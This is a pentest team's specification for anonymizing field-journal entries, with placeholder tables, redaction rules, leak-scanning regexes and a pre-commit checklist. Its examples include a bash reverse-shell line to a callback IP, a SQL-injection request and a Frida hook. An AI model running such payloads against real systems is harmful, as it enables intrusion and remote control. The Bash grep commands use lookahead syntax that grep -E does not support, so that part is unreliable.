# Field-Journal anonymization spec

> When writing field-journal entries, submitting PRs, sharing payloads, or publishing external reports, you **must anonymize**. The placeholder conventions below are adapted from the anonymization protocol of the PentAGI multi-agent system, with the goal of **preserving reusable value while never exposing the real target**.

## Placeholder master table

### Network and hosts

| Type | Placeholder | Applicable scenario |
|------|-------------|---------------------|
| Target IP | `{target_ip}` | Pentest target host |
| Victim IP | `{victim_ip}` | Next hop in intranet lateral movement |
| Remote host | `{remote_host}` | Generic remote address |
| Server IP | `{server_ip}` | C2 / relay / public callback |
| Callback domain | `{callback_domain}` | OOB / reverse shell |
| Target domain | `{target_domain}` | Web / email target |
| Victim domain | `{victim_domain}` | Intranet domain |
| Custom port | `{port}` | Non-standard port |
| Standard ports | keep the original value | Keep 80 / 443 / 22 / 445 / 3389 etc. for reusability |

### Credentials and keys

| Type | Placeholder |
|------|-------------|
| Username | `{username}` |
| Password | `{password}` |
| Hash | `{hash}` |
| Session token | `{token}` |
| API key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer | `{bearer_token}` |

### URLs and endpoints

| Type | Placeholder |
|------|-------------|
| Generic URL | `{url}` |
| API endpoint | `{api_endpoint}` |
| Callback URL | `{callback_url}` |
| Upload point | `{upload_endpoint}` |
| Login endpoint | `{login_endpoint}` |

### Paths

| Type | Placeholder |
|------|-------------|
| Install directory | `{install_dir}` |
| Config file | `{config_path}` |
| Web root | `{webroot}` |
| Upload directory | `{upload_dir}` |
| Log path | `{log_path}` |

### Business identifiers

| Type | Placeholder |
|------|-------------|
| Real name | `{user_name}` |
| Email | `{user_email}` |
| Phone number | `{phone}` |
| Employee ID | `{employee_id}` |
| Order ID | `{order_id}` |
| UUID | `{uuid}` |

## Things NOT to anonymize

To preserve reusability, **do not replace** the following:

- CVE identifiers (`CVE-2024-1234`)
- Tool names and versions (`sqlmap 1.7.10`)
- Standard ports (80 / 443 / 445 / 1433 / 3306 etc.)
- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
- Generic payload templates (`<script>alert(1)</script>`, `' OR 1=1--`)
- Library and function names (`OpenSSL`, `memcpy`, `strncpy`)
- Protocol and field names (`Kerberos AS-REQ`, `LDAP bind`)

## Context-preservation principle

When replacing, **preserve the semantic structure** so readers still know what it is:

```python
# ❌ Replacing everything with X destroys semantics
target = "X"
url = "X/X"

# ❌ Replacement too generic
target = "{target}"
url = "{url}"

# ✅ Context preserved
target_ip = "{target_ip}"           # 192.168.10.50
target_url = "{target_url}/admin"   # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```

## Payload anonymization

### Web payload

```
Original:   GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
            Host: shop.victim-corp.cn
            Cookie: PHPSESSID=abcdef123456

Anonymized: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
            Host: {target_domain}
            Cookie: PHPSESSID={session_id}
```

### Shell payload

```bash
# Original
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# Anonymized
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```

### Frida hook script

```javascript
// Original
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    ...
};

// Anonymized
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    ...
};
```

## Binary sample anonymization

### Hashes

Recording the sha256 is enough — **do not attach the original file**. If a sample must be shared:

- Upload to a public sample repository such as VirusTotal or MalwareBazaar
- Link to a sample with the same hash already analyzed by others

### Strings and symbols

```c
// Original
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// Anonymized
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```

## Screenshot anonymization

- Redact with mosaic or solid black: usernames, emails, phone numbers, order IDs, names
- In the URL bar show only the domain structure (keep the path, mask the host), or replace entirely
- Blur internal IP ranges to the first two octets: `10.0.x.x` instead of `10.0.10.50`
- Any imagery identifying the enterprise (logo / watermark) must be masked

## CTF special cases

CTF problem statements, target hostnames, and flag formats are **usually not sensitive** (the targets are public), but:

- Self-hosted private ranges must be treated like real environments
- Flags must not be published before the competition ends
- Do not copy other people's unpublished solutions directly into the field-journal

## Auto-detection script

After writing a field-journal entry, run the regexes below to catch missed anonymization:

```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# Public IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# Email
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# Mainland China phone numbers
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux equivalent
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```

Wrap this into a `field-journal/scripts/scan-leaks.ps1` and run it before every commit.

## Reverse: reading other people's anonymized docs

When reading someone else's field-journal / writeup and you encounter placeholders like `{target_ip}`, **do not substitute the real values from your own environment and commit** — just keep the placeholders as-is.

## Field-Journal mandatory checklist

Check against this list before committing a field-journal entry:

```
□ No public IPs (except CDNs / public services)
□ No real domains (except demonstration domains like example.com)
□ No real credentials / tokens / hashes (replaced with {placeholder})
□ No names / employee IDs / emails leaking from screenshots
□ No sample files themselves (sha256 only)
□ All JWTs / OAuth codes / API keys replaced
□ Internal IP ranges blurred to first two octets (10.0.x.x)
□ Target parameters in payloads replaced with generic placeholders
□ Cookies and session IDs replaced
```

Append this checklist directly to the end of `field-journal/_template.md`.
